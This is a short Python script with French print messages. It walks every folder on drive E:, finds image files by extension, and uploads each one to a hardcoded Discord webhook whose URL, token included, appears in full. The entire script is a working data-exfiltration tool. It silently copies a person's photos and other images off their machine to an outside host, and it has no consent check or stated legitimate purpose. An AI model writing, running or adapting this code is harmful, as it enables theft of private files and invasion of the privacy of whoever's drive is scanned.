import requests
import os

WEBHOOK_URL = "https://discordapp.com/api/webhooks/1410619274720055317/-V4w7U5MKF7ggn6xFGrDZfFm4JYzdhQ0wywW7EKzzVS22a2FbCXqI6rXMtj-kjhHM54C"

drive_root = "E:\\"
image_extensions = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff'}

for root, dirs, files in os.walk(drive_root):
    for file in files:
        ext = os.path.splitext(file)[1].lower()
        if ext in image_extensions:
            image_path = os.path.join(root, file)
            with open(image_path, "rb") as f:
                response = requests.post(
                    WEBHOOK_URL,
                    files={"file": (os.path.basename(image_path), f)}
                )
            print(f"Image envoyée : {image_path} | Status: {response.status_code}")
